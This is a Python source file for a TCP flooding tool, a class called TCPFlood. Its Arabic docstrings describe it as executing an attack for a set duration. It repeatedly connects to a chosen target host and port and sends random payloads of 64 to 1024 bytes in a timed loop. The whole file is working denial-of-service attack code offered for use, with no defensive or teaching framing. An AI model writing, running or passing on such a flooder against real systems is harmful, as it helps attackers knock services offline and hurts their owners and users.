#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import random
import time
import threading

class TCPFlood:
    def __init__(self, target_host, target_port, stats_callback=None):
        self.target_host = target_host
        self.target_port = target_port
        self.stats_callback = stats_callback
        
    def create_packet(self):
        """إنشاء حزمة TCP عشوائية"""
        payload_size = random.randint(64, 1024)
        return random._urandom(payload_size)
        
    def send_packet(self):
        """إرسال حزمة TCP واحدة"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target_host, self.target_port))
            
            packet = self.create_packet()
            sock.send(packet)
            sock.close()
            
            if self.stats_callback:
                self.stats_callback(success=True)
            return True
            
        except Exception:
            if self.stats_callback:
                self.stats_callback(success=False)
            return False
            
    def flood(self, duration):
        """تنفيذ هجوم لمدة محددة"""
        start_time = time.time()
        while time.time() - start_time < duration:
            self.send_packet()
            time.sleep(random.uniform(0.001, 0.01))
